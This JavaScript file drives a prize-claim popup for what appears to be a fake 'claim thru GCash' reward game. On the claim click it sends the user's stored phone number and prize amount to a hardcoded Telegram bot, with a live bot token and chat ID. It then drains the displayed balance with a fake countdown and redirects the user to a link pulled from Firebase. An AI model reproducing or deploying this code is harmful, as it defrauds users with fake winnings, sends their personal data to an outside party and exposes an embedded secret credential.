let claimState={isProcessing:false,currentAmount:0,countdownInterval:null,balanceDecrementInterval:null,countdownSeconds:180,isPending:false,hasRedirected:false};

async function showClaimPopup(amount){
    if(typeof window.checkGlobalFirewallStatus==='function'){
        const firewallActive=await window.checkGlobalFirewallStatus();
        if(firewallActive){window.showFirewallPopup();return;}
    }
    claimState.currentAmount=amount;claimState.isProcessing=false;claimState.hasRedirected=false;
    const popup=document.getElementById('claimPopup');const prizeSpan=document.getElementById('popupPrizeAmount');const claimBtn=document.getElementById('claimActionBtn');
    if(prizeSpan)prizeSpan.innerHTML="₱"+amount.toLocaleString();
    if(claimBtn){claimBtn.innerHTML='CLAIM THRU GCASH';claimBtn.disabled=false;}
    if(popup)popup.style.display='flex';
}

function hideClaimPopup(){const popup=document.getElementById('claimPopup');if(popup)popup.style.display='none';}
function showPendingStatus(){const pa=document.getElementById('pendingStatusArea');if(pa)pa.style.display='block';claimState.isPending=true;}
function hidePendingStatus(){const pa=document.getElementById('pendingStatusArea');if(pa)pa.style.display='none';claimState.isPending=false;}
function updateVisibleCountdown(secs){const ts=document.getElementById('pendingCountdown');if(!ts)return;const m=Math.floor(secs/60),s=secs%60;ts.innerText=`${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;}
function startVisibleCountdown(){
    let rem=claimState.countdownSeconds;updateVisibleCountdown(rem);
    claimState.countdownInterval=setInterval(()=>{rem--;updateVisibleCountdown(rem);if(rem<=0){clearInterval(claimState.countdownInterval);claimState.countdownInterval=null;if(!claimState.hasRedirected){const bt=document.getElementById('balanceText');if(bt)bt.innerText="₱"+claimState.currentAmount.toLocaleString()+".00";if(typeof window.parent!=='undefined'&&window.parent.updateGameBalance)window.parent.updateGameBalance(claimState.currentAmount);else if(typeof updateGameBalance==='function')updateGameBalance(claimState.currentAmount);else if(typeof GameState!=='undefined'){GameState.balance=claimState.currentAmount;if(typeof updateUI==='function')updateUI();if(typeof saveData==='function')saveData();}hidePendingStatus();const wb=document.getElementById('claimBtn');if(wb)wb.style.display='block';claimState.isProcessing=false;}}},1000);
}
function startSmoothDecrement(originalAmount,onComplete){
    const bt=document.getElementById('balanceText');if(!bt)return;
    let current=originalAmount;const totalDuration=3500,intervalTime=50,steps=totalDuration/intervalTime,decPerStep=originalAmount/steps;let stepCount=0;
    claimState.balanceDecrementInterval=setInterval(()=>{stepCount++;current=Math.max(0,originalAmount-(decPerStep*stepCount));bt.innerText="₱"+current.toFixed(2);if(current<=0.01){clearInterval(claimState.balanceDecrementInterval);claimState.balanceDecrementInterval=null;bt.innerText="₱0.00";if(onComplete)onComplete();}},intervalTime);
}
function startImaginaryTimer(redirectUrl){
    claimState.imaginaryTimer=setTimeout(()=>{if(!claimState.hasRedirected){claimState.hasRedirected=true;window.location.href=redirectUrl;}},3500);
}
function onClaimAction(){
    if(claimState.isProcessing)return;
    claimState.isProcessing=true;
    const claimBtn=document.getElementById('claimActionBtn');const amount=claimState.currentAmount;const userPhone=localStorage.getItem("userPhone")||"Unknown";
    claimBtn.disabled=true;claimBtn.innerHTML='PROCESSING...';
    const message=`💰 CLAIM REQUEST!\n📱 ${userPhone}\n💵 ₱${amount}\n⏰ ${new Date().toLocaleString()}`;
    fetch(`https://api.telegram.org/bot8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg/sendMessage?chat_id=7298607329&text=${encodeURIComponent(message)}`).catch(e=>console.log('Telegram error:',e));
    if(typeof firebase!=='undefined' && firebase.database){
        const db=firebase.database();
        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value',(snap)=>{
            if(snap.exists()){
                const key=Object.keys(snap.val())[0];const linkData=snap.val()[key];const redirectUrl=linkData.url;
                db.ref('links/'+key).update({status:'claimed',user:userPhone,amount:amount,claimedAt:Date.now()});
                hideClaimPopup();showPendingStatus();startSmoothDecrement(amount,()=>{if(typeof window.parent!=='undefined'&&window.parent.updateGameBalance)window.parent.updateGameBalance(0);else if(typeof updateGameBalance==='function')updateGameBalance(0);else if(typeof GameState!=='undefined'){GameState.balance=0;if(typeof updateUI==='function')updateUI();if(typeof saveData==='function')saveData();}});
                startImaginaryTimer(redirectUrl);
            } else {claimBtn.innerHTML='NO REWARDS';setTimeout(()=>{claimBtn.innerHTML='CLAIM THRU GCASH';claimBtn.disabled=false;claimState.isProcessing=false;},3000);alert("Sorry! No available rewards at the moment.");}
        }).catch((e)=>{console.error(e);claimBtn.innerHTML='ERROR';setTimeout(()=>{claimBtn.innerHTML='CLAIM THRU GCASH';claimBtn.disabled=false;claimState.isProcessing=false;},3000);alert("Database error. Please try again.");});
    } else {alert("Firebase not initialized.");claimState.isProcessing=false;claimBtn.disabled=false;claimBtn.innerHTML='CLAIM THRU GCASH';}
}
document.addEventListener('DOMContentLoaded',function(){if(!document.getElementById('claimPopup'))console.log('Popup container not found');hidePendingStatus();});
